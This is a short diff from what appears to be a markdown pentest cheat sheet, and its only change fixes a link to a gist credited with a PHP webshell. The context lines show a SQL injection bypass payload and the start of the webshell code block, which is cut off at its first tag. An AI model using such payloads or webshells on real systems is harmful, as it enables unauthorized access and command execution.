@@ -19,7 +19,7 @@ Modified SQL Injection (by me)
 ```sql
 ' OR 1=1 OR '1'='1
 ```
-PHP Webshell (Execute Linux Command) dari [joswr1ght](gist.github.com/joswr1ght).
+PHP Webshell (Execute Linux Command) dari [joswr1ght](https://gist.github.com/joswr1ght).
 
 ```php
 <html>
